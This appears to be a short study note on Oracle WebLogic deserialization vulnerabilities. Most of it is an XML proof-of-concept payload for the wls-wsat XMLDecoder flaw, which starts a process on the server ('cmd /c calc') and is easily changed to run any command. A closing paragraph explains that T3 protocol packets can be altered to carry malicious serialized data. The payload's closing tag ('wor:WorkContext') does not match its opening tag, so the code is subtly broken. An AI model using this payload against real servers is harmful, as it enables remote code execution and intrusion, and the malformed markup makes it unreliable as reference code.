# WebLogic deserialization

## XMLDecoder

The `wls-wsat` component of the `WebLogic` use the `XMLDecoder` class to deserialize JavaBean instance data in XML format without checking permission.

The example POC is as follow:

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.8.0_151" class="java.beans.XMLDecoder">
            <object class="java.lang.ProcessBuilder">
                <array class="java.lang.String" length="3">
                <void index = "0">
                    <string>cmd</string>
                </void>
                <void index = "1">
                    <string>/c</string>
                </void>
                <void index = "2">
                    <string>calc</string>
                </void>
                </array>
                <void method="start"/>
                </object>
                </java>
        </wor:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

## T3 protocol

The T3 protocol is the communication protocol used for RMI in the `WebLogic`.

In a T3 packet, the first part is the packet length, T3 protocol header and `WebLogic` deserialization flag. Then the other parts are multiple groups of deserialized data.

Therefore, we can modify the T3 packet and put malicious deserialization data.
